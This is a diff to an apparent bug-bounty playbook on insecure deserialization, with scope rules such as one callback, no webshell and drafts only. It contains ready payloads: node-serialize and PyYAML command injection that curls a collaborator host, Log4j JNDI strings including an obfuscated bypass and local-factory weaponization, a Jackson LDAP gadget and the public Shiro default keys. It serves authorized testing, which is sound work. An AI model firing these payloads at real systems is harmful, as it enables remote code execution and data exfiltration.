@@ -13,7 +13,7 @@ The server turns bytes you control into objects. Impact depends on the gadget th
 - In-scope only. One callback or one `id`.
 - No exploit-kit spray, no gadget brute force, no hashcat on ViewState/Shiro keys, no webshell.
 - Do not enable remote class loading, do not load a JAR, do not `MODULE LOAD`.
-- Known **default** product keys (one public Shiro key) are a single test, not a wordlist.
+- Known **default** product keys (the two public Shiro sample keys below) are a single test each, not a wordlist.
 - Stop at draft. Never auto-submit.
 - After JDK 8u191 / 11.0.1, a remote JNDI codebase is off by default. An LDAP lookup is not automatically RCE.
 
@@ -32,6 +32,9 @@ The server turns bytes you control into objects. Impact depends on the gadget th
    | JSON `"@type"` / `["com.sun....", {` | Fastjson / Jackson default typing |
    | `\x04\x08` | Ruby Marshal |
    | `__VIEWSTATE` | .NET ViewState (LosFormatter / ObjectStateFormatter) |
+   | JSON `"$type"` | Newtonsoft.Json `TypeNameHandling` (not `None`) |
+   | `Content-Type: application/x-hessian` or `x-application/hessian`, Dubbo body | Hessian. One callback, then one gadget that matches a library you saw |
+   | XML the error names as XStream, or `com.thoughtworks.xstream` | XStream. One callback. Do not paste a long gadget chain |
    | `${jndi:` in a field that is logged | Log4j lookup — not Java serialization, same proof rules |
 
 2. **Benign confirmation first.**
@@ -43,13 +46,13 @@ The server turns bytes you control into objects. Impact depends on the gadget th
 3. **Code execution, one gadget that matches what you know is loaded.**
    - Java commons-collections 3.1 → `CommonsCollections6`; 4.x → `CommonsCollections2`; Spring on the classpath → `Spring1`; otherwise stop after URLDNS and say which libraries you actually saw (JAR name, error class).
    - PHP → `phpggc` for the framework the error traces name (Laravel, Symfony, Monolog, Guzzle, Magento). Current chains, not a 2016 `__wakeup` copied from a blog. Command: `curl http://UNIQUE.collab/$(whoami)`.
-   - Python pickle `__reduce__` → `os.system` or `curl`. PyYAML: `!!python/object/apply:os.system ["curl http://UNIQUE.collab/"]`.
-   - Ruby: `Gem::Requirement` / `Gem::Installer` only if `YAML.load` / `Marshal.load` is the sink and the callback fires.
-   - .NET: `ysoserial.net` `TypeConfuseDelegate` only with a **disabled MAC** or a key you read from config. One `curl`.
+   - Python pickle `__reduce__` → `os.system` or `curl`. Same sink when `torch.load`, `joblib.load`, or `numpy.load(..., allow_pickle=True)` accepts your bytes. PyYAML 6+: `yaml.load` without a Loader raises — the sink is `unsafe_load` / `load(..., Loader=Loader)` / `FullLoader` on 5.1–5.4. Payload: `!!python/object/apply:os.system ["curl http://UNIQUE.collab/"]`. SnakeYAML 2.0+ `new Yaml()` does **not** honor global tags (`!!javax.script` is a miss) unless they pass a custom `Constructor`. Older SnakeYAML: a `!!javax.script.ScriptEngineManager` URL fetch is the lookup; a command callback is RCE. js-yaml 3 `load` (not `safeLoad`) runs `!!js/function`; js-yaml 4 `load` does not — match the lockfile.
+   - Ruby: `Gem::Requirement` / `Gem::Installer` only if the callback fires. On Ruby 3.1+ (Psych 4) `YAML.load` is safe; the sinks are `YAML.unsafe_load`, older `Psych.load`, and `Marshal.load`.
+   - .NET: `ysoserial.net` `TypeConfuseDelegate` only with a **disabled MAC** or a key you read from config. Newtonsoft `$type` only when config or the error shows `TypeNameHandling` other than `None`. One `curl`. BinaryFormatter: off by default on .NET 5–7, throws on .NET 8 unless `EnableUnsafeBinaryFormatterSerialization` is set, **removed** in .NET 9. A missing formatter is not a bug.
    - Node `node-serialize`: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').execSync('curl http://UNIQUE.collab/'+process.env.USER)}()"}`.
    - Jackson default typing: `JdbcRowSetImpl` with `dataSourceName: ldap://UNIQUE.collab/a` and `autoCommit: true`. LDAP hit = gadget ran. RCE only if you also get command evidence and the JDK still loads remote code, or a local gadget returns output.
-4. **Log4j.** `${jndi:dns://UNIQUE.collab/a}` on one user-controlled field that is likely logged (User-Agent, username, a search box). DNS = lookup works. `${jndi:ldap://...}` follow-up fetch = JNDI client. Command callback = RCE. Obfuscation when the literal is stripped: `${${lower:j}ndi:${lower:d}ns://UNIQUE.collab/a}`. Versions 2.15 through 2.17 had bypasses; 2.17.1+ disabled the lookup. Do not claim RCE from DNS alone.
-5. **Shiro.** One request with the public default key `kPH+bIxk5D2deZiIxcaaaA==` (CVE-2016-4437) wrapping a URLDNS or a curl gadget. If the cookie does not decode, stop. Do not run a key list.
+4. **Log4j.** `${jndi:dns://UNIQUE.collab/a}` on one user-controlled field that is likely logged (User-Agent, username, a search box). DNS = lookup works. `${jndi:ldap://...}` follow-up fetch = JNDI client. Command callback = RCE. Obfuscation when the literal is stripped: `${${lower:j}ndi:${lower:d}ns://UNIQUE.collab/a}`. On JDKs past 8u191/11.0.1 the remote codebase is ignored, so the working weaponization is a **local factory**: your LDAP server returns a reference naming a factory class already on the target's classpath (Tomcat `org.apache.naming.factory.BeanFactory` feeding `javax.el.ELProcessor`, or Groovy's `GroovyClassLoader`) instead of a remote codebase. Same proof bar — a command callback, not the LDAP fetch. Remote `${jndi:}` in a log message applies through 2.14.1, is incomplete in 2.15.0, and is removed in 2.16.0 (Java 8), 2.12.2 (Java 7), and 2.3.1 (Java 6). 2.17.0 fixed a self-referential lookup DoS, not a new RCE. 2.17.1 / 2.12.4 / 2.3.2 fixed a JDBC appender that needs control of the logging config. Do not claim RCE from DNS alone.
+5. **Shiro.** One request with the public default key `kPH+bIxk5D2deZiIxcaaaA==` (CVE-2016-4437) wrapping a URLDNS or a curl gadget. If that key does not decode the cookie, try the other sample key `4AvVhmFLUs0KTA3Kprsdag==` once. If neither decodes, stop. Do not run a key list.
 
 ## Validation
 | Evidence | Claim |
